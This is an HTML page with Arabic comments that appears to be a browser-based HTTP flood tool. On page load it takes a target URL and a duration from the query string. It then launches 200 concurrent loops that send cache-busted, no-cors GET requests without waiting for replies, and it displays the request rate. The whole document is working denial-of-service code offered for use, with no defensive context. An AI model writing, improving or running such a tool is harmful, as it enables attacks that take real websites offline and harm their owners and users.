
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>أداة إرسال طلبات فائقة السرعة</title>
    <script>
        const config = {
            parallelRequests: 200,    // زيادة عدد العمال إلى 200
            requestTimeout: 1000,    // تقليل وقت الانتظار إلى ثانية واحدة
            cacheBusting: true       // تجنب التخزين المؤقت
        };

        let stats = {
            total: 0,
            rps: 0,
            startTime: 0
        };
        let isRunning = false;
        let intervalId;

        function getQueryParams() {
            const params = new URLSearchParams(window.location.search);
            return {
                url: params.get('url') || '',
                time: parseInt(params.get('time')) || 10
            };
        }

        function getRandomHeaders() {
            return {
                'Cache-Control': 'no-cache'
            };
        }

        function fireRequest(url) {
            if (!isRunning) return;

            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), config.requestTimeout);

            const fullUrl = url + (config.cacheBusting ? `&_=${Math.random().toString(36).slice(2)}` : '');
            fetch(fullUrl, {
                method: 'GET',
                headers: getRandomHeaders(),
                mode: 'no-cors',
                cache: 'no-store',
                signal: controller.signal
            })
            .then(() => {
                stats.total++;
                stats.rps++;
            })
            .catch(() => {}) // تجاهل الأخطاء للسرعة
            .finally(() => clearTimeout(timeout));
        }

        function startFlood(targetUrl, duration) {
            if (!targetUrl) {
                document.body.textContent = 'خطأ: يرجى إضافة ?url=الرابط_الهدف';
                return;
            }

            stats = { total: 0, rps: 0, startTime: Date.now() };
            isRunning = true;

            intervalId = setInterval(() => {
                document.body.textContent = `rps ${stats.rps} total ${stats.total}`;
                stats.rps = 0;
            }, 1000);

            // إطلاق الطلبات بشكل مستمر
            const workers = Array(config.parallelRequests).fill().map(() => {
                return async () => {
                    while (isRunning && Date.now() < stats.startTime + (duration * 1000)) {
                        fireRequest(targetUrl); // بدون await للسرعة القصوى
                    }
                };
            });

            workers.forEach(worker => worker());
            setTimeout(stopFlood, duration * 1000);
        }

        function stopFlood() {
            isRunning = false;
            clearInterval(intervalId);
            document.body.textContent = `تم الإنتهاء | rps ${stats.rps} total ${stats.total}`;
        }

        window.onload = function() {
            document.body.style.margin = '0';
            document.body.style.padding = '0';
            document.body.style.fontFamily = 'monospace';
            document.body.style.fontSize = '24px';
            document.body.style.textAlign = 'center';
            document.body.style.paddingTop = '50px';
            document.body.style.backgroundColor = 'white';
            document.body.style.color = 'black';

            const { url, time } = getQueryParams();
            startFlood(url, time);
        };
    </script>
</head>
<body></body>
</html>
